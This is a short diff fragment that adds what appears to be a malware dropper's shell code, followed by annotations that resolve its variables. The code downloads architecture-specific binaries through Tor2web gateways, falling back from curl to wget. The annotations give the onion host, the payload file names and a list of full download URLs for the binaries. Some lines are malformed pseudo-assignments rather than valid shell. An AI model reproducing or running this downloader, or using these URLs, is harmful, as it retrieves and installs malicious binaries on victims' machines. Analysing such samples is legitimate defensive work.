@@ -1,0 +1,25 @@
+if [ ! $(echo "${ARCH}"|grep 'x86_64'|wc -l) -eq 0 ]; then
+    (${curl} ${COPTS} ${RHOST}${TOR1}${RPATH2B} -o ${LPATH}${LBIN3}||${curl} ${COPTS} ${RHOST}${TOR2}${RPATH2B} -o ${LPATH}${LBIN3}||${curl} ${COPTS} ${RHOST}${TOR3}${RPATH2B} -o ${LPATH}${LBIN3}||${wget} ${WOPTS} ${RHOST}${TOR1}${RPATH2B} -O ${LPATH}${LBIN3}||${wget} ${WOPTS} ${RHOST}${TOR2}${RPATH2B} -O ${LPATH}${LBIN3}||${wget} ${WOPTS} ${RHOST}${TOR3}${RPATH2B} -O ${LPATH}${LBIN3})
+    RBIN=${RBIN1}
+
+
+Rhost = https://an7kmd2wp4xo7hpr'
+TOR1 =".tor2web.su/"
+TOR2=".d2web.org/"
+TOR3=".onion.sh/"
+
+RPATH2B="images/${RBIN1}"
+RPATH3B="images/${RBIN2}"
+
+RBIN1="${Pref}64x75"
+RBIN2="${Pref}32x75"
+
+Pref = a or r
+
+paths = [
+https://an7kmd2wp4xo7hpr.tor2web.su/images/a64x75,
+https://an7kmd2wp4xo7hpr.tor2web.su/images/a32x75,
+https://an7kmd2wp4xo7hpr.tor2web.su/images/r64x75,
+https://an7kmd2wp4xo7hpr.tor2web.su/images/r32x75,
+
+]
